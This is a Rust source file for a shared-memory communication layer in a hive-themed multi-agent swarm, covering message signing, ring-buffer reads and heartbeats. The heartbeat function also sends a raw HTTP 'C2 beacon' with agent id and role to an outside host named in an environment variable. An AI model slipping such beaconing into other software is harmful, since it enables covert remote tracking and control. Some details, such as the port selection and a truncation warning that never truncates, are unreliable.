// Communication layer: shared-memory arena instead of TCP bus.
// Each agent writes to and reads from a common ring buffer in shared memory.
// No sockets, no ports, no separate bus process.

use crate::arena_mgr;
use crate::ldc::{Message, Role};
use crate::shared_arena as arena;
use crate::identity::AgentIdentity;
use ed25519_dalek::Signer;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use tracing::{info, warn};
use uuid::Uuid;

// ── HiveChamber ─────────────────────────────────────────────────────────────
// The unified communication interface. Manages access to the shared arena.

pub struct HiveChamber {
    arena: Arc<arena_mgr::SharedArenaMapping>,
    identity: AgentIdentity,
    my_slot: usize,
    my_role: u8,
    last_read_seq: AtomicU64,
}

impl HiveChamber {
    /// Connect to the swarm via shared memory arena.
    /// This is the ONLY communication method - no TCP fallback.
    pub async fn connect(identity: &AgentIdentity, role: Role) -> Result<Self, std::io::Error> {
        let role_u8 = role_to_u8(&role);

        // Connect to the shared arena
        let mapping = arena_mgr::connect_to_arena()?;
        let ptr = mapping.as_ptr();

        // Initialize if we own it
        if mapping.is_owned() {
            if !arena::verify_arena(ptr) {
                arena::init_arena(ptr);
                info!("Created new colmena arena (shared memory)");
            }
        }

        // Wait for arena to be initialized by owner (up to 3 seconds)
        let mut retries = 0;
        while !arena::verify_arena(ptr) && retries < 30 {
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
            retries += 1;
        }
        if !arena::verify_arena(ptr) {
            return Err(std::io::Error::new(
                std::io::ErrorKind::NotFound,
                "Arena not initialized after 3s timeout",
            ));
        }

        // Register in the arena
        let id_bytes = identity.id().as_bytes().to_owned();
        let slot_idx = arena::find_or_claim_agent_slot(ptr, id_bytes)
            .ok_or_else(|| std::io::Error::new(
                std::io::ErrorKind::AddrInUse,
                "Arena full - no agent slots available",
            ))?;

        arena::set_agent_role(ptr, slot_idx, role_u8);
        arena::set_verifying_key(ptr, slot_idx, identity.verifying_key_bytes());

        let now = crate::utils::timestamp_now();
        arena::update_heartbeat(ptr, slot_idx, now);

        // Snapshot current write cursor so we only read new messages
        let start_seq = arena::write_cursor_ref(ptr).load(Ordering::Acquire);

        info!(
            "Connected to colmena arena (slot {}, role: {:?})",
            slot_idx, role
        );

        Ok(Self {
            arena: Arc::new(mapping),
            identity: identity.clone(),
            my_slot: slot_idx,
            my_role: role_u8,
            last_read_seq: AtomicU64::new(start_seq),
        })
    }

    /// Publish a signed LdC message to the arena.
    pub async fn publish(&self, msg: Message) {
        let ptr = self.arena.as_ptr();

        // Serialize message with MessagePack
        let data = rmp_serde::to_vec(&msg).unwrap_or_default();
        if data.len() > arena::MAX_MSG_SIZE {
            warn!("Message too large ({} bytes), truncating", data.len());
        }

        // Sign the serialized payload
        let sign_key = self.identity.signing_key();
        let mut signature_bytes = [0u8; 64];
        let sig = sign_key.sign(&data);
        signature_bytes.copy_from_slice(&sig.to_bytes());

        let verifying_key = self.identity.verifying_key_bytes();
        let id_bytes = self.identity.id().as_bytes().to_owned();

        // Claim a slot
        let (seq, slot_idx) = arena::claim_slot(ptr);
        let slot = arena::message_slot_mut(ptr, slot_idx);

        // Write the message
        arena::write_message_slot(
            slot,
            seq,
            msg.timestamp,
            id_bytes,
            verifying_key,
            signature_bytes,
            self.my_role,
            &data,
        );
    }

    /// Send a heartbeat: update our last_heartbeat in the registry.
    /// Also sends an optional beacon to the C2 server if HIVE_C2_URL is set.
    pub async fn send_heartbeat(&self) {
        let now = crate::utils::timestamp_now();
        arena::update_heartbeat(self.arena.as_ptr(), self.my_slot, now);

        // Auto-beacon to C2 via raw HTTP (no extra deps)
        if let Ok(c2_url) = std::env::var("HIVE_C2_URL") {
            let beacon = format!(
                r#"{{"type":"heartbeat","agent_id":"{}","role":"{:?}","timestamp":{}}}"#,
                self.identity.id(), self.role(), now
            );
            let c2 = c2_url.clone();
            tokio::spawn(async move {
                send_c2_beacon(&c2, &beacon).await;
            });
        }
    }

    /// Read all NEW messages from the arena (since last read).
    /// Returns deserialized LdC Messages.
    pub async fn read_new(&self) -> Vec<Message> {
        let ptr = self.arena.as_ptr();
        let mut messages = Vec::new();

        let current_cursor = arena::write_cursor_ref(ptr);
        let latest_seq = current_cursor.load(Ordering::Acquire);
        let mut my_seq = self.last_read_seq.load(Ordering::Relaxed);

        // If we're too far behind, skip to near-latest (avoid spinning)
        if latest_seq > my_seq + (arena::MAX_MESSAGES as u64) {
            my_seq = latest_seq.saturating_sub(arena::MAX_MESSAGES as u64);
        }

        // Scan from last_read_seq to latest
        while my_seq < latest_seq {
            let slot_idx = (my_seq % arena::MAX_MESSAGES as u64) as usize;
            let slot = arena::message_slot_ptr(ptr, slot_idx);

            let slot_seq = arena::read_slot_seq(slot);
            if slot_seq > my_seq {
                // This slot has been overwritten with newer data - skip
                my_seq += 1;
                continue;
            }
            if slot_seq == 0 {
                // Slot not yet written
                break;
            }

            // Read the message
            unsafe {
                let payload_len = (*slot).payload_len as usize;
                if payload_len > 0 && payload_len <= arena::MAX_MSG_SIZE {
                    let payload_slice =
                        std::slice::from_raw_parts((*slot).payload.as_ptr(), payload_len);
                    if let Ok(msg) = rmp_serde::from_slice::<Message>(payload_slice) {
                        // Skip own messages
                        if msg.agent_id != self.identity.id() {
                            messages.push(msg);
                        }
                    }
                }
            }
            my_seq += 1;
        }

        self.last_read_seq.store(my_seq, Ordering::Release);
        messages
    }

    /// Get the list of active (non-dead) agents with their last heartbeat.
    pub async fn get_active_agents(&self, timeout_secs: u64) -> Vec<(Uuid, Role, u64)> {
        let ptr = self.arena.as_ptr();
        let now = crate::utils::timestamp_now();
        let mut agents = Vec::new();

        arena::enumerate_agents(ptr, |id_bytes, role_u8, hb, _vk| {
            if now.saturating_sub(hb) < timeout_secs {
                let id = Uuid::from_bytes(id_bytes);
                let role = u8_to_role(role_u8);
                agents.push((id, role, hb));
            }
        });

        agents
    }

    /// Check for dead agents and mark them. Returns list of newly-dead agent IDs.
    pub async fn check_dead_agents(&self, timeout_secs: u64) -> Vec<Uuid> {
        let ptr = self.arena.as_ptr();
        let now = crate::utils::timestamp_now();
        let mut dead = Vec::new();

        for i in 0..arena::MAX_AGENTS {
            let flags = arena::agent_flags_val(ptr, i);
            if (flags & 1) != 0 && (flags & 2) == 0 {
                let hb = arena::last_heartbeat_val(ptr, i);
                if now.saturating_sub(hb) > timeout_secs {
                    let id_bytes = arena::agent_id_val(ptr, i);
                    arena::mark_agent_dead(ptr, i);
                    let id = Uuid::from_bytes(id_bytes);
                    warn!("Agent {} marked DEAD (no heartbeat for {}s)", id, now - hb);
                    dead.push(id);
                }
            }
        }

        dead
    }

    pub fn arena_ptr(&self) -> *mut u8 {
        self.arena.as_ptr()
    }

    pub fn agent_id(&self) -> Uuid {
        self.identity.id()
    }

    pub fn role(&self) -> Role {
        u8_to_role(self.my_role)
    }

    pub fn identity(&self) -> &AgentIdentity {
        &self.identity
    }

    pub fn my_slot_idx(&self) -> usize {
        self.my_slot
    }
}

fn u8_to_role(val: u8) -> Role {
    match val {
        0 => Role::Worker,
        1 => Role::Weaver,
        2 => Role::Drone,
        3 => Role::Honeybee,
        4 => Role::Queen,
        5 => Role::Swarm,
        _ => Role::Worker,
    }
}

fn role_to_u8(role: &Role) -> u8 {
    match role {
        Role::Worker => 0,
        Role::Weaver => 1,
        Role::Drone => 2,
        Role::Honeybee => 3,
        Role::Queen => 4,
        Role::Swarm => 5,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_role_to_u8() {
        assert_eq!(role_to_u8(&Role::Worker), 0);
        assert_eq!(role_to_u8(&Role::Queen), 4);
        assert_eq!(role_to_u8(&Role::Swarm), 5);
    }

    #[test]
    fn test_u8_to_role() {
        assert_eq!(u8_to_role(0), Role::Worker);
        assert_eq!(u8_to_role(4), Role::Queen);
        assert_eq!(u8_to_role(99), Role::Worker);
    }
}

/// Send a beacon to the C2 server via raw HTTP POST.
async fn send_c2_beacon(c2_url: &str, body: &str) {
    use tokio::io::AsyncWriteExt;
    let host = c2_url
        .trim_start_matches("https://")
        .trim_start_matches("http://")
        .split('/').next().unwrap_or("localhost")
        .split(':').next().unwrap_or("localhost");
    let port = if c2_url.contains(":844") { 8445u16 } else { 8443 };
    let addr = format!("{}:{}", host, port);
    let request = format!(
        "POST /beacon HTTP/1.1\r\nHost: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        host, body.len(), body
    );
    if let Ok(mut stream) = tokio::net::TcpStream::connect(&addr).await {
        let _ = stream.write_all(request.as_bytes()).await;
    }
}
